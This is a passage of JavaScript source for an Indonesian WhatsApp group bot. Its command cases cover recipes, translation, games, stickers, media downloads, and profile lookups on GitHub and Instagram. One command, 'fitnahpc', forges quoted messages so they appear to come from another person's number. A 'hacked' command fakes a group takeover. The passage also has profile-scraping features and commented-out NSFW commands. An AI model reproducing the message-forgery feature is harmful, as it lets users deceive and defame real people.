					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					zero.sendMessage(from, buff, image, {quoted: ftrol, caption: hasilresep})
					break 
					case 'artimimpi':
if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${apikey7}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'bilangangka':
              if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${apikey7}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'kalkulator':
 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'fancytext':
if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${apikey7}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'githubstalk':
              if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${apikey7}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					zero.sendMessage(from, buff, image, {quoted: ftrol, caption: gstalk})
					break 
case 'truth':
        const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, ttrth, 'GK JALANIN WAJIB DONATE',truteh, but, {quoted: zer})
	        	break
		case 'dare':
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "😎??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		todz = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, der, 'GK JALANIN WAJIB DONATE',todz, but, {quoted: zer})
       	   break
          case 'simi':
           case 'p':
           case 'bot':
           if (args.length == 0) return reply(`Hallo Kak ${pushname}`)
           teksni = args.join(" ")
           get_result = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${apikey1}&text=${teksni}`)
           getresult = get_result.result
             reply(getresult)         
             break
					case 'translate':
				case 'ts':
try{
					if ( args.length === 1 ){
						tekss = zer.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {zero: 'gtx', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split(' ')[0];
			bhs = ngab.split(' ')[1];
			  translate(teks, {zero: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				reply(mess.error.api)
			}
				  break
				case 'playstore':
      if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(`${q}`)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
              case 'brainly':
  if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					zero.sendMessage(from, teks, text,{quoted:ftrol,detectLinks: false})                        
		            })              
					break
					case 'igstory': 
  if(!q) return reply('Usernamenya?')
            hx.igstory(`${q}`)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    zero.sendMessage(from,link,video,{quoted: ftrol,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    zero.sendMessage(from,link,image,{quoted: ftrol,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
/*case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                  reply(mess.wait)
               anu = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey1}`)
                zero.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `Jangan Lupa Subscribe Bambang Official `, quoted: zer})
case 'lolli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
       
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = ( await zero.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'✗✗✗ Bambang Tri R', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              zero.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break*/
            case 'igstalk':
try{
if (!q) return reply('Usernamenya?')
ig.fetchUser(`${args.join(' ')}`).then(Y => {
console.log(`${args.join(' ')}`)
ten = `${Y.profile_pic_url_hd}`
teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})} catch {
const tod = await fetchJson(
`https://api.lolhuman.xyz/api/igstalk?username=${q}`
);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*
\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
zero.sendMessage(from, nih_buff, image, { quoted: ftrol, caption: tt });
}
break
case 'sertiff':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang*`)
                   F = body.slice(10)
                   reply(mess.wait)
                   anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/sertiff?nama=${F}&apikey=12345`)
                   zero.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `Jangan Lupa Subscribe Bambang Official `, quoted: zer})
                   break
                  /* case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':  
				case 'ttp':  
				case 'attp':
          if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
					//if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp BTR X-BOT OFFICIAL v.0.1`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikey1}&text=${encodeURI(q)}`)
					zero.sendMessage(from, atetepe, sticker, { quoted: ftrol })
					break*/
case 'sertiff2':  
     case 'sertiff3':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang*`)
                   F = body.slice(11)
                   reply(mess.wait)
                   anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/${command}?nama=${F}&apikey=${bambangkey}`)
                   zero.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: zer})
                   break
case 'twmp4': case 'twitter':
		if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fakethumb
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
		if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
khs = await getBuffer(Anu)
zero.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:ftrol, ptt:true})
})
break
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
   if(!q) return reply('cari group apa?')
            hx.linkwa(`${q}`)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
            case 'chara':
		if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(`${q}`)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await zero.sendMessage(from,li,image,{quoted: ftrol})
            break
            case 'otaku':
        if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(`${q}`)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            zero.sendMessage(from,ram,image,{quoted:ftrol,caption:rem})
            break
            case 'komiku':
    if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(`${q}`)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
            case 'getpict':
				case 'getpic':
              if (!isGroup) return reply(mess.only.group)
            mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await zero.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            zero.sendMessage(from, pict, image, {quoted: ftrol})
            break
            case 'getbio':
            var yy = zer.message.extendedTextMessage.contextInfo.participant
var p = await zero.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                case 'cerpen':
                anu = await fetchJson(`https://raku-web.herokuapp.com/api/cerpen?apikey=RakuKeyTod`)
               anu1 = `*JUDUL* : ${anu.result.result.title}\n`
               anu1 += `*PENGARANG* : ${anu.result.result.pengarang}\n`
               anu1 += `*KATEGORI* : ${anu.result .result.kategori}\n` 
               anu1 += `*CERITA* : ${anu.result.result.cerpen}\n`
               reply(anu1)
                break
               case 'artinama':
               
               if (args.length == 0) return reply(`Example: ${prefix + command} Bambang`)
               anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/artinama?nama=${args.join(' ')}&apikey=12345`)
               reply(anu.result)
               break
case 'creategrup':
              if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (zer.message.extendedTextMessage != undefined){
                    mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					zero.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
				case 'tictactoe':
case 'ttt':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
if (zer.message.extendedTextMessage === undefined || zer.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = zer.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
zero.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
break
case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses')
break
case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await zero.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await zero.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				zero.sendMessage(from, buffer, image, {quoted: ftrol})
		} else {
		}
			  break
			case 'getdeskgc':
              if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await zero.groupMetadata(anu)
				zero.sendMessage(from, metadete.desc, text, {quoted:ftrol})
				  break
				case 'sider':
              if (!isGroup) return reply(mess.only.group)
infom = await zero.messageInfo(from, zer.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'hacked':
                 if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.bodmin)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   zero.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                zero.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                zero.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                zero.sendMessage(from, 'Succes Hacked', text, {quoted: ftrol})
					break
					case 'fitnahpc':
              if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    zero.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
					case 'kontak':
              if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (zer.message.extendedTextMessage != undefined){
                    mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
              if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (zer.message.extendedTextMessage != undefined){
                    		mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'resetlinkgroup':
         case 'revoke':
                if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.bodmin)
          json = ['action', 'inviteReset', from]
         zero.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
         case 'sticktag':
              if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await zero.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./sticker/${wanu[1]}.webp`)
				zero.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
				case 'totag':
              if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
            if ((isMedia && !zer.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !zer.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !zer.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !zer.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !zer.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !zer.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            file = await zero.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await zero.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            zero.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await zero.sendMessage(from,di,image,{quoted: zer})
            break
/*case 'getname':
        var ambl = zer.message.extendedTextMessage.contextInfo.participant
const sname = zero.contacts[ambl] != undefined ? zero.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : zero.contacts[ambl].notify || zero.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break*/
      case "getname":
        var ambl = zer.message.extendedTextMessage.contextInfo.participant;
        const sname =
          zero.contacts[ambl] != undefined
            ? zero.contacts[ambl].sname || zero.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = zero.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${zero.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
        case 'stickerwm':
					case 'swm':
              if (isMedia && !zer.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
							const media = await zero.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											zero.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: ftrol})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && zer.message.videoMessage.fileLength < 10000000 || isQuotedVideo && zer.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
							const media = await zero.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							sticWait(from)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											zero.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: ftrol})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
